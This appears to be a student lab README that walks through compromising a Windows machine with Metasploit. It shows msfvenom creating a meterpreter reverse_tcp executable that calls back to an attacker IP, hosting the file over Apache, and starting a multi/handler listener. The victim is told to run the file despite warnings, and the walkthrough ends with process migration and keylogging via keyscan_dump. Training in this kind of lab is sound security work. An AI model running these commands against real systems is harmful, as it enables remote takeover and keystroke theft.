# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
![image](https://github.com/Subhikshaa13/Compromising-windows-using-Metasploit/assets/118787344/d499f48a-e8d0-40f4-862c-c5cf469e154d)

Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

![image](https://github.com/Subhikshaa13/Compromising-windows-using-Metasploit/assets/118787344/2c48fce9-2041-42b3-9e87-64d1ce5a1b0b)

copy the fun.exe into the apache /var/www/html folder

![image](https://github.com/Subhikshaa13/Compromising-windows-using-Metasploit/assets/118787344/510e50f0-5f60-4b1d-ae53-5cf7129077fe)

Start apache server sudo systemctl apache2 start

![image](https://github.com/Subhikshaa13/Compromising-windows-using-Metasploit/assets/118787344/667a073e-f26c-4896-ad40-c10f3b785abd)

Check the status of apache2

![image](https://github.com/Subhikshaa13/Compromising-windows-using-Metasploit/assets/118787344/498fbf23-2092-4365-8690-694498f18a98)

Invoke msfconsole:

## OUTPUT:
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit

![image](https://github.com/Subhikshaa13/Compromising-windows-using-Metasploit/assets/118787344/cc011855-a441-4e50-928e-f34e067550c7)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.

![image](https://github.com/Subhikshaa13/Compromising-windows-using-Metasploit/assets/118787344/08800a00-ea8f-49c4-a0e0-f304ce97d1cb)

Bypass any warning boxes, double-click the file, and allow it to run.

![image](https://github.com/Subhikshaa13/Compromising-windows-using-Metasploit/assets/118787344/1c08dd70-522b-4473-bf34-637cfa1482d2)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

![image](https://github.com/Subhikshaa13/Compromising-windows-using-Metasploit/assets/118787344/d0e9e51f-56d4-4011-a0f7-18d62e2ddf33)

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted


![image](https://github.com/Subhikshaa13/Compromising-windows-using-Metasploit/assets/118787344/0894b7e9-782c-4ec1-8e93-08115ff09066)

keyscan_dump Shows the keystrokes captured so far


![image](https://github.com/Subhikshaa13/Compromising-windows-using-Metasploit/assets/118787344/756212f9-9f04-4e37-9335-95f21b11e25d)


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
